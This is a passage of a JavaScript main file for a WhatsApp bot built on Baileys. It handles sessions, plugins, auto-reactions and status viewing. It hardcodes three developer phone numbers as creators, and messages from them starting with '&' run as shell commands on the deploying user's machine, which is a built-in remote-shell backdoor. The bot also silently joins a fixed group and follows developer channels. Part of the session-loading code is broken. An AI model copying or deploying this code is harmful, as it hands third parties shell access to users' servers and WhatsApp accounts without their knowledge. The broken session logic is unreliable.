// Anti-crash handler
process.on("uncaughtException", (err) => {
  console.error("[❗] Uncaught Exception:", err.stack || err);
});

process.on("unhandledRejection", (reason, p) => {
  console.error("[❗] Unhandled Promise Rejection:", reason);
});

// caseyrhodes 

const axios = require("axios");
const config = require("./settings");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  jidNormalizedUser,
  isJidBroadcast,
  getContentType,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  AnyMessageContent,
  prepareWAMessageMedia,
  areJidsSameUser,
  downloadContentFromMessage,
  MessageRetryMap,
  generateForwardMessageContent,
  generateWAMessageFromContent,
  generateMessageID,
  makeInMemoryStore,
  jidDecode,
  fetchLatestBaileysVersion,
  Browsers,
} = require(config.BAILEYS);

const l = console.log;
const {
  getBuffer,
  getGroupAdmins,
  getRandom,
  h2k,
  isUrl,
  Json,
  runtime,
  sleep,
  fetchJson,
} = require("./lib/functions");
const {
  AntiDelDB,
  initializeAntiDeleteSettings,
  setAnti,
  getAnti,
  getAllAntiDeleteSettings,
  saveContact,
  loadMessage,
  getName,
  getChatSummary,
  saveGroupMetadata,
  getGroupMetadata,
  saveMessageCount,
  getInactiveGroupMembers,
  getGroupMembersMessageCount,
  saveMessage,
} = require("./data");
const fsSync = require("fs");
const fs = require("fs").promises;
const ff = require("fluent-ffmpeg");
const P = require("pino");
const GroupEvents = require("./lib/groupevents");
const { PresenceControl, BotActivityFilter } = require("./data/presence");
const qrcode = require("qrcode-terminal");
const StickersTypes = require("wa-sticker-formatter");
const util = require("util");
const { sms, downloadMediaMessage, AntiDelete } = require("./lib");
const FileType = require("file-type");
const { File } = require("megajs");
const { fromBuffer } = require("file-type");
const bodyparser = require("body-parser");
const chalk = require("chalk");
const os = require("os");
const Crypto = require("crypto");
const path = require("path");
const { getPrefix } = require("./lib/prefix");
const readline = require("readline");

const ownerNumber = ["218942841878"];

// Temp directory management
const tempDir = path.join(os.tmpdir(), "cache-temp");
if (!fsSync.existsSync(tempDir)) {
  fsSync.mkdirSync(tempDir);
}

const clearTempDir = () => {
  fsSync.readdir(tempDir, (err, files) => {
    if (err) {
      console.error(chalk.red("[❌] Error clearing temp directory:", err.message));
      return;
    }
    for (const file of files) {
      fsSync.unlink(path.join(tempDir, file), (err) => {
        if (err) console.error(chalk.red(`[❌] Error deleting temp file ${file}:`, err.message));
      });
    }
  });
};
setInterval(clearTempDir, 5 * 60 * 1000);

// Express server (placeholder for future API routes)
const express = require("express");
const app = express();
const port = process.env.PORT || 7860;

// Session authentication
let malvin;

const sessionDir = path.join(__dirname, "./sessions");
const credsPath = path.join(sessionDir, "creds.json");

if (!fsSync.existsSync(sessionDir)) {
  fsSync.mkdirSync(sessionDir, { recursive: true });
}

async function loadSession() {
  try {
    if (!config.SESSION_ID) {
      console.log(chalk.red("No SESSION_ID provided - Falling back to QR or pairing code"));
      return null;
    }

    if (config.SESSION_ID.startsWith("JUNE-MD:~")) {
      console.log(chalk.yellow("[ ⏳ ] Decoding base64 session..."));
      const base64Data = config.SESSION_ID.replace("JUNE-MD:~", "");
      if (!/^[A-Za-z0-9+/=]+$/.test(base64Data)) {
        throw new Error("Invalid base64 format in SESSION_ID");
      }
      const decodedData = Buffer.from(base64Data, "base64");
      let sessionData;
      try {
        sessionData = JSON.parse(decodedData.toString("utf-8"));
      } catch (error) {
        throw new Error("Failed to parse decoded base64 session data: " + error.message);
      }
      fsSync.writeFileSync(credsPath, decodedData);
      console.log(chalk.green("[ ✅ ] Base64 session decoded and saved successfully"));
      return sessionData;
    } else if (config.SESSION_ID.startsWith("JUNE-MD:~")) {
      console.log(chalk.yellow("[ ⏳ ] Downloading MEGA.nz session..."));
      const megaFileId = config.SESSION_ID.replace("JUNE-MD:~", "");
      const filer = File.fromURL(`https://mega.nz/file/${megaFileId}`);
      const data = await new Promise((resolve, reject) => {
        filer.download((err, data) => {
          if (err) reject(err);
          else resolve(data);
        });
      });
      fsSync.writeFileSync(credsPath, data);
      console.log(chalk.green("[ ✅ ] MEGA session downloaded successfully"));
      return JSON.parse(data.toString());
    } else {
      throw new Error("Invalid SESSION_ID format. Use 'Mercedes~' for base64 or 'Mercedes~' for MEGA.nz");
    }
  } catch (error) {
    console.error(chalk.red("❌ Error loading session:", error.message));
    console.log(chalk.green("Will attempt QR code or pairing code login"));
    return null;
  }
}

async function connectWithPairing(malvin, useMobile) {
  if (useMobile) {
    throw new Error("Cannot use pairing code with mobile API");
  }
  if (!process.stdin.isTTY) {
    console.error(chalk.red("❌ Cannot prompt for phone number in non-interactive environment"));
    process.exit(1);
  }

  console.log(chalk.bgYellow.black(" ACTION REQUIRED "));
  console.log(chalk.green("┌" + "─".repeat(46) + "┐"));
  console.log(chalk.green("│ ") + chalk.bold("Enter WhatsApp number to receive pairing code") + chalk.green(" │"));
  console.log(chalk.green("└" + "─".repeat(46) + "┘"));
  
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
  });
  const question = (text) => new Promise((resolve) => rl.question(text, resolve));

  let number = await question(chalk.cyan("» Enter your number (e.g., +254740007567): "));
  number = number.replace(/[^0-9]/g, "");
  rl.close();

  if (!number) {
    console.error(chalk.red("❌ No phone number provided"));
    process.exit(1);
  }

  try {
    let code = await malvin.requestPairingCode(number);
    code = code?.match(/.{1,4}/g)?.join("-") || code;
    console.log("\n" + chalk.bgGreen.black(" SUCCESS ") + " Use this pairing code:");
    console.log(chalk.bold.yellow("┌" + "─".repeat(46) + "┐"));
    console.log(chalk.bold.yellow("│ ") + chalk.bgWhite.black(code) + chalk.bold.yellow(" │"));
    console.log(chalk.bold.yellow("└" + "─".repeat(46) + "┘"));
    console.log(chalk.yellow("Enter this code in WhatsApp:\n1. Open WhatsApp\n2. Go to Settings > Linked Devices\n3. Tap 'Link a Device'\n4. Enter the code"));
  } catch (err) {
    console.error(chalk.red("Error getting pairing code:", err.message));
    process.exit(1);
  }
}

// Helper function to validate JID
function isValidJid(jid) {
  return jid && typeof jid === 'string' && jid.includes('@');
}

// Helper function to safely send messages
async function safeSendMessage(jid, content, options = {}) {
  try {
    if (!isValidJid(jid)) {
      console.error(chalk.red(`[ ❌ ] Invalid JID: ${jid}`));
      return null;
    }
    return await malvin.sendMessage(jid, content, options);
  } catch (error) {
    console.error(chalk.red(`[ ❌ ] Error sending message to ${jid}:`, error.message));
    return null;
  }
}

async function connectToWA() {
  console.log(chalk.cyan("[ 🟠 ] Connecting to WhatsApp ⏳️..."));

  const creds = await loadSession();
  const { state, saveCreds } = await useMultiFileAuthState(path.join(__dirname, "./sessions"), {
    creds: creds || undefined,
  });

  const { version } = await fetchLatestBaileysVersion();

  const pairingCode = config.PAIRING_CODE === "true" || process.argv.includes("--pairing-code");
  const useMobile = process.argv.includes("--mobile");

  malvin = makeWASocket({
    logger: P({ level: "silent" }),
    printQRInTerminal: !creds && !pairingCode,
    browser: ['macOS', 'Firefox', '120.0'],
    syncFullHistory: true,
    auth: state,
    version,
    getMessage: async () => ({}),
  });

  if (pairingCode && !state.creds.registered) {
    await connectWithPairing(malvin, useMobile);
  }

  malvin.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect, qr } = update;

    if (connection === "close") {
      const reason = lastDisconnect?.error?.output?.statusCode;
      if (reason === DisconnectReason.loggedOut) {
        console.log(chalk.red("[ 🛑 ] Connection closed, please change session ID or re-authenticate"));
        if (fsSync.existsSync(credsPath)) {
          fsSync.unlinkSync(credsPath);
        }
        process.exit(1);
      } else {
        console.log(chalk.red("[ ⏳️ ] Connection lost, reconnecting..."));
        setTimeout(connectToWA, 5000);
      }
    } else if (connection === "open") {
      console.log(chalk.green("[ 🤖 ] caseyrhodes Connected ✅"));

      // Load plugins
      const pluginPath = path.join(__dirname, "plugins");
      try {
        console.log(chalk.cyan("[ 🔧 ] Loading plugins..."));
        
        // First, load malvin.js to initialize command registry
        try {
          const malvinModule = require('./malvin');
          console.log(chalk.green(`[ ✅ ] Command registry loaded: ${malvinModule.commands ? malvinModule.commands.length : 0} commands`));
          
          // List all commands
          if (malvinModule.commands && malvinModule.commands.length > 0) {
            console.log(chalk.cyan("[ 📋 ] Available commands:"));
            malvinModule.commands.forEach((cmd, i) => {
              console.log(chalk.cyan(`  ${i+1}. ${cmd.pattern} - ${cmd.desc || 'No description'}`));
            });
          }
        } catch (malvinErr) {
          console.error(chalk.red("[ ❌ ] Error loading malvin.js:", malvinErr.message));
          console.error(chalk.red("[ ❌ ] Commands will not work without malvin.js"));
        }
        
        // Load plugins
        const plugins = fsSync.readdirSync(pluginPath);
        let loadedCount = 0;
        let errorCount = 0;
        
        for (const plugin of plugins) {
          if (path.extname(plugin).toLowerCase() === ".js") {
            const pluginName = path.basename(plugin, '.js');
            
            // Skip problematic plugins
            if (pluginName === 'Createapi') {
              console.log(chalk.yellow(`[ ⚠️ ] Skipping problematic plugin: ${plugin}`));
              continue;
            }
            
            try {
              const pluginPathFull = path.join(pluginPath, plugin);
              console.log(chalk.cyan(`[ ⏳ ] Loading plugin: ${pluginName}`));
              
              // Clear require cache to ensure fresh load
              delete require.cache[require.resolve(pluginPathFull)];
              
              require(pluginPathFull);
              loadedCount++;
              console.log(chalk.green(`[ ✅ ] Loaded plugin: ${pluginName}`));
            } catch (err) {
              errorCount++;
              console.error(chalk.red(`[ ❌ ] Error loading plugin ${pluginName}:`, err.message));
              // Don't stop on plugin errors
            }
          }
        }
        
        // Final status
        console.log(chalk.green(`[ 📊 ] Plugins loaded: ${loadedCount} successful, ${errorCount} failed`));
        
        // Reload malvin.js to get updated commands from plugins
        try {
          delete require.cache[require.resolve('./malvin')];
          const malvinModule = require('./malvin');
          console.log(chalk.green(`[ 📊 ] Total commands after plugins: ${malvinModule.commands ? malvinModule.commands.length : 0}`));
        } catch (err) {
          console.error(chalk.red("[ ❌ ] Failed to reload command registry"));
        }
        
      } catch (err) {
        console.error(chalk.red("[ ❌ ] Error loading plugins:", err.message));
        console.error(chalk.red("[ ❌ ] Some features may not work"));
      }

      // Send connection message
      try {
        await sleep(2000);
        
        // Safely get JID
        let jid;
        try {
          if (malvin.user?.id) {
            jid = malvin.decodeJid(malvin.user.id);
            if (!isValidJid(jid)) {
              const botNumber = malvin.user.id.split(':')[0];
              jid = botNumber ? `${botNumber}@s.whatsapp.net` : null;
            }
          }
        } catch (err) {
          console.error(chalk.yellow("[ ⚠️ ] Error decoding bot JID:", err.message));
          jid = null;
        }

        if (!isValidJid(jid)) {
          console.error(chalk.red("[ 🔴 ] Cannot send connection notice: No valid bot JID"));
          return;
        }

        const botname = "Caseyrhodes";
        const ownername = "caseyweb";
        const prefix = getPrefix();
        const username = "caseyweb";
        const mrmalvin = `https://github.com/${username}`;
        const repoUrl = "https://github.com/caseyweb/CASEYRHODES-XMD";
        
        // Get current date and time
        const currentDate = new Date();
        const date = currentDate.toLocaleDateString();
        const time = currentDate.toLocaleTimeString();
        
        // Format uptime
        function formatUptime(seconds) {
          const days = Math.floor(seconds / (24 * 60 * 60));
          seconds %= 24 * 60 * 60;
          const hours = Math.floor(seconds / (60 * 60));
          seconds %= 60 * 60;
          const minutes = Math.floor(seconds / 60);
          seconds = Math.floor(seconds % 60);
          
          return `${days}d ${hours}h ${minutes}m ${seconds}s`;
        }
        
        const uptime = formatUptime(process.uptime());

        // Newsletter follow status
        const newsletterChannels = [
          "120363299029326322@newsletter",
          "120363401297349965@newsletter",
          "120363339980514201@newsletter",
        ];

        // Follow newsletters and track status
        let followed = [];
        let alreadyFollowing = [];
        let failed = [];

        for (const channelJid of newsletterChannels) {
          try {
            if (!isValidJid(channelJid)) {
              console.warn(chalk.yellow(`[ ⚠️ ] Invalid newsletter JID: ${channelJid}`));
              failed.push(channelJid);
              continue;
            }
            
            console.log(chalk.cyan(`[ 📡 ] Checking metadata for ${channelJid}`));
            const metadata = await malvin.newsletterMetadata("jid", channelJid);
            if (!metadata.viewer_metadata) {
              await malvin.newsletterFollow(channelJid);
              followed.push(channelJid);
              console.log(chalk.green(`[ ✅ ] Followed newsletter: ${channelJid}`));
            } else {
              alreadyFollowing.push(channelJid);
              console.log(chalk.yellow(`[ 📌 ] Already following: ${channelJid}`));
            }
          } catch (error) {
            failed.push(channelJid);
            console.error(chalk.red(`[ ❌ ] Failed to follow ${channelJid}: ${error.message}`));
            
            // Send error to owner with safe JID validation
            const ownerJid = `${ownerNumber[0]}@s.whatsapp.net`;
            if (isValidJid(ownerJid)) {
              await safeSendMessage(ownerJid, {
                text: `Failed to follow ${channelJid}: ${error.message}`,
              });
            }
          }
        }

        // Create single connection message with newsletter status
        const upMessage = `
*┏──〔 Connected 〕───⊷*   
*┇ Prefix: ${prefix}*
*┇ Date: ${date}*
*┇ Time: ${time}*
*┇ Uptime: ${uptime}*
*┇ Owner: ${ownername}*
*┇ Newsletter Status:*
*┇ • Followed: ${followed.length}*
*┇ • Already Following: ${alreadyFollowing.length}*
*┇ • Failed: ${failed.length}*
*┇ Follow Channel:*  
*┇ https://shorturl.at/DYEi0*
*┗──────────────⊷*
> *Report any error to the dev*`;

        try {
          // Send single message with image and caption
          await safeSendMessage(jid, {
            image: { url: "https://files.catbox.moe/jker7x.jpg" },
            caption: upMessage,
            contextInfo: {
              forwardingScore: 5,
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: '120363302677217436@newsletter', 
                newsletterName: "CASEYRHODES-XMD",
                serverMessageId: 143
              }
            }
          }, { quoted: null });
          console.log(chalk.green("[ 📩 ] Connection notice sent successfully with image"));
        } catch (imageError) {
          console.error(chalk.yellow("[ ⚠️ ] Image failed, sending text-only:"), imageError.message);
          await safeSendMessage(jid, { 
            text: upMessage,
            contextInfo: {
              forwardingScore: 5,
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: '120363302677217436@newsletter', 
                newsletterName: "CASEYRHODES-XMD",
                serverMessageId: 143
              }
            }
          });
          console.log(chalk.green("[ 📩 ] Connection notice sent successfully as text"));
        }

        console.log(
          chalk.cyan(
            `📡 Newsletter Follow Status:\n✅ Followed: ${followed.length}\n📌 Already following: ${alreadyFollowing.length}\n❌ Failed: ${failed.length}`
          )
        );

      } catch (sendError) {
        console.error(chalk.red(`[ 🔴 ] Error sending connection notice: ${sendError.message}`));
        
        // Send error to owner with safe JID validation
        const ownerJid = `${ownerNumber[0]}@s.whatsapp.net`;
        if (isValidJid(ownerJid)) {
          await safeSendMessage(ownerJid, {
            text: `Failed to send connection notice: ${sendError.message}`,
          });
        }
      }

      // Join WhatsApp group
      const inviteCode = "GBz10zMKECuEKUlmfNsglx";
      try {
        await malvin.groupAcceptInvite(inviteCode);
        console.log(chalk.green("[ ✅ ] joined the WhatsApp group successfully"));
      } catch (err) {
        console.error(chalk.red("[ ❌ ] Failed to join WhatsApp group:", err.message));
        
        // Send error to owner with safe JID validation
        const ownerJid = `${ownerNumber[0]}@s.whatsapp.net`;
        if (isValidJid(ownerJid)) {
          await safeSendMessage(ownerJid, {
            text: `Failed to join group with invite code ${inviteCode}: ${err.message}`,
          });
        }
      }
    }

    if (qr && !pairingCode) {
      console.log(chalk.red("[ 🟢 ] Scan the QR code to connect or use --pairing-code"));
      qrcode.generate(qr, { small: true });
    }
  });

  malvin.ev.on("creds.update", saveCreds);

// =====================================
	 
  malvin.ev.on('messages.update', async updates => {
    for (const update of updates) {
      if (update.update.message === null) {
        console.log("Delete Detected:", JSON.stringify(update, null, 2));
        try {
          await AntiDelete(malvin, updates);
        } catch (err) {
          console.error("AntiDelete error:", err.message);
        }
      }
    }
  });

// anti-call

malvin.ev.on('call', async (calls) => {
  try {
    if (config.ANTI_CALL !== 'true') return;

    for (const call of calls) {
      if (call.status !== 'offer') continue; // Only respond on call offer

      const id = call.id;
      const from = call.from;

      // Validate call JID
      if (!isValidJid(from)) {
        console.error(chalk.red(`[ ❌ ] Invalid call JID: ${from}`));
        continue;
      }

      try {
        await malvin.rejectCall(id, from);
        await safeSendMessage(from, {
          text: config.REJECT_MSG || '*вυѕу ¢αℓℓ ℓαтєя*'
        });
        console.log(`Call rejected and message sent to ${from}`);
      } catch (err) {
        console.error("Call rejection error:", err.message);
      }
    }
  } catch (err) {
    console.error("Anti-call error:", err);
  }
});	
	
//=========WELCOME & GOODBYE =======
	
malvin.ev.on('presence.update', async (update) => {
    try {
      await PresenceControl(malvin, update);
    } catch (err) {
      console.error("Presence update error:", err.message);
    }
});

// always Online 

malvin.ev.on("presence.update", (update) => {
  try {
    PresenceControl(malvin, update);
  } catch (err) {
    console.error("Presence control error:", err.message);
  }
});

	
BotActivityFilter(malvin);	
	
 /// READ STATUS       
  malvin.ev.on('messages.upsert', async(mek) => {
    try {
      // DEBUG: Log message receipt
      console.log(chalk.cyan('='.repeat(60)));
      console.log(chalk.green('[MSG] New message received'));
      
      mek = mek.messages[0];
      if (!mek.message) {
        console.log(chalk.yellow('[MSG] No message content'));
        return;
      }
      
      // Get message type and body
      const type = getContentType(mek.message);
      let body = '';
      
      if (type === 'conversation') {
        body = mek.message.conversation || '';
      } else if (type === 'extendedTextMessage') {
        body = mek.message.extendedTextMessage?.text || '';
      } else if (type === 'imageMessage') {
        body = mek.message.imageMessage?.caption || '';
      } else if (type === 'videoMessage') {
        body = mek.message.videoMessage?.caption || '';
      }
      
      console.log(chalk.cyan(`[MSG] From: ${mek.key.remoteJid}`));
      console.log(chalk.cyan(`[MSG] Type: ${type}`));
      console.log(chalk.cyan(`[MSG] Body: "${body}"`));
      
      const prefix = getPrefix();
      console.log(chalk.cyan(`[MSG] Prefix: "${prefix}"`));
      const isCmd = body?.startsWith(prefix) || false;
      console.log(chalk.cyan(`[MSG] Is command? ${isCmd}`));
      
      mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
        ? mek.message.ephemeralMessage.message 
        : mek.message;
      
      //console.log("New Message Detected:", JSON.stringify(mek, null, 2));
      
      if (config.READ_MESSAGE === 'true' && mek.key) {
        try {
          await malvin.readMessages([mek.key]);  // Mark message as read
          console.log(`Marked message from ${mek.key.remoteJid} as read.`);
        } catch (err) {
          console.error("Error marking message as read:", err.message);
        }
      }
      
      if (mek.message?.viewOnceMessageV2) {
        mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
          ? mek.message.ephemeralMessage.message 
          : mek.message;
      }
      
      if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true") {
        try {
          await malvin.readMessages([mek.key]);
        } catch (err) {
          console.error("Error reading status:", err.message);
        }
      }

      const newsletterJids = [
        "120363401297349965@newsletter",
        "120363339980514201@newsletter",
        "120363299029326322@newsletter",
      ];
      const emojis = ["😂", "🥺", "👍", "☺️", "🥹", "♥️", "🩵"];

      if (mek.key && newsletterJids.includes(mek.key.remoteJid)) {
        try {
          const serverId = mek.newsletterServerId;
          if (serverId) {
            const emoji = emojis[Math.floor(Math.random() * emojis.length)];
            await malvin.newsletterReactMessage(mek.key.remoteJid, serverId.toString(), emoji);
          }
        } catch (e) {
          console.error("Newsletter react error:", e.message);
        }
      }	  
	  
      if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true") {
        try {
          const jawadlike = await malvin.decodeJid(malvin.user.id);
          if (!isValidJid(jawadlike)) {
            console.error("Invalid jawadlike JID");
            return;
          }
          
          const emojis =  ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '👏', '🤎', '✅', '🫀', '🧡', '😶', '🥹', '🌸', '🕊️', '🌷', '⛅', '🌟', '🥺', '🇵🇰', '💜', '💙', '🌝', '🖤', '💚'];
          const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
          
          if (isValidJid(mek.key.remoteJid)) {
            await malvin.sendMessage(mek.key.remoteJid, {
              react: {
                text: randomEmoji,
                key: mek.key,
              } 
            }, { statusJidList: [mek.key.participant, jawadlike] });
          }
        } catch (err) {
          console.error("Status react error:", err.message);
        }
      }                       
      
      if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true") {
        try {
          const user = mek.key.participant;
          if (!isValidJid(user)) {
            console.error("Invalid user JID for status reply");
            return;
          }
          
          const text = `${config.AUTO_STATUS_MSG}`;
          await safeSendMessage(user, { text: text, react: { text: '💜', key: mek.key } }, { quoted: mek });
        } catch (err) {
          console.error("Status reply error:", err.message);
        }
      }
      
      try {
        await saveMessage(mek);
      } catch (err) {
        console.error("Error saving message:", err.message);
      }
      
      const m = sms(malvin, mek);
      const content = JSON.stringify(mek.message);
      const from = mek.key.remoteJid;
      const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage?.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : [];
      const isGroup = from?.endsWith('@g.us') || false;
      const sender = mek.key.fromMe ? (malvin.user.id.split(':')[0]+'@s.whatsapp.net' || malvin.user.id) : (mek.key.participant || mek.key.remoteJid);
      const senderNumber = sender?.split('@')[0] || '';
      const botNumber = malvin.user?.id?.split(':')[0] || '';
      const pushname = mek.pushName || 'Sin Nombre';
      const isMe = botNumber.includes(senderNumber);
      const isOwner = ownerNumber.includes(senderNumber) || isMe;
      const botNumber2 = await jidNormalizedUser(malvin.user.id);
      const groupMetadata = isGroup ? await malvin.groupMetadata(from).catch(e => {}) : '';
      const groupName = isGroup ? groupMetadata.subject : '';
      const participants = isGroup ? await groupMetadata.participants : '';
      const groupAdmins = isGroup ? await getGroupAdmins(participants) : '';
      const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false;
      const isAdmins = isGroup ? groupAdmins.includes(sender) : false;
      const isReact = m.message?.reactionMessage ? true : false;
      const reply = (teks) => {
        if (isValidJid(from)) {
          safeSendMessage(from, { text: teks }, { quoted: mek });
        }
      };
      
      const ownerNumbers = ["218942841878", "254740007567", "254790375710"];
      const sudoUsers = JSON.parse(fsSync.readFileSync("./lib/sudo.json", "utf-8") || "[]");
      const devNumber = config.DEV ? String(config.DEV).replace(/[^0-9]/g, "") : null;
      const creatorJids = [
        ...ownerNumbers,
        ...(devNumber ? [devNumber] : []),
        ...sudoUsers,
      ].map((num) => num.replace(/[^0-9]/g, "") + "@s.whatsapp.net");
      const isCreator = creatorJids.includes(sender) || isMe;

      if (isCreator && body?.startsWith("&")) {
        let code = body.slice(2);
        if (!code) {
          reply(`Provide me with a query to run Master!`);
          console.warn(`No code provided for & command`, { Sender: sender });
          return;
        }
        const { spawn } = require("child_process");
        try {
          let resultTest = spawn(code, { shell: true });
          resultTest.stdout.on("data", data => {
            reply(data.toString());
          });
          resultTest.stderr.on("data", data => {
            reply(data.toString());
          });
          resultTest.on("error", data => {
            reply(data.toString());
          });
          resultTest.on("close", code => {
            if (code !== 0) {
              reply(`command exited with code ${code}`);
            }
          });
        } catch (err) {
          reply(util.format(err));
        }
        return;
      }

      //==========public react============//
      
      // Auto React for all messages (public and owner)
      if (!isReact && config.AUTO_REACT === 'true' && mek.key) {
        try {
          const reactions = [
            '🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', 
            '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕', 
            '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️', 
            '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑', 
            '💍', '👝', '💼', '🎒', '🥽', '🐻', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', 
            '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', 
            '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', 
            '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', 
            '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤', 
            '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪', 
            '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', 
            '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', 
            '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', 
            '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', 
            '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰'
          ];
          const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
          m.react(randomReaction);
        } catch (err) {
          console.error("Auto react error:", err.message);
        }
      }

      // owner react
      if (!isReact && senderNumber === botNumber) {
        if (config.OWNER_REACT === 'true' && mek.key) {
          try {
            const reactions = [
              '🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕', '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️', '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑', '💍', '👝', '💼', '🎒', '🥽', '🐻 ', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '🎎', '🎏', '🎐', '⚽', '🧣', '🌿', '⛈️', '🌦️', '🌚', '🌝', '🙈', '🙉', '🦖', '🐤', '🎗️', '🥇', '👾', '🔫', '🐝', '🦋', '🍓', '🍫', '🍭', '🧁', '🧃', '🍿', '🍻', '🛬', '🫀', '🫠', '🐍', '🥀', '🌸', '🏵️', '🌻', '🍂', '🍁', '🍄', '🌾', '🌿', '🌱', '🍀', '🧋', '💒', '🏩', '🏗️', '🏰', '🏪', '🏟️', '🎗️', '🥇', '⛳', '📟', '🏮', '📍', '🔮', '🧿', '♻️', '⛵', '🚍', '🚔', '🛳️', '🚆', '🚤', '🚕', '🛺', '🚝', '🚈', '🏎️', '🏍️', '🛵', '🥂', '🍾', '🍧', '🐣', '🐥', '🦄', '🐯', '🐦', '🐬', '🐋', '🦆', '💈', '⛲', '⛩️', '🎈', '🎋', '🪀', '🧩', '👾', '💸', '💎', '🧮', '👒', '🧢', '🎀', '🧸', '👑', '〽️', '😳', '💀', '☠️', '👻', '🔥', '♥️', '👀', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤', '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪', '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰', '🧳', '🌉', '🌁', '🛤️', '🛣️', '🏚️', '🏠', '🏡', '🧀', '🍥', '🍮', '🍰', '🍦', '🍨', '🍧', '🥠', '🍡', '🧂', '🍯', '🍪', '🍩', '🍭', '🥮', '🍡'
            ];
            const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
            m.react(randomReaction);
          } catch (err) {
            console.error("Owner react error:", err.message);
          }
        }
      }
        
      // custum react settings        
                        
      // Custom React for all messages (public and owner)
      if (!isReact && config.CUSTOM_REACT === 'true' && mek.key) {
        try {
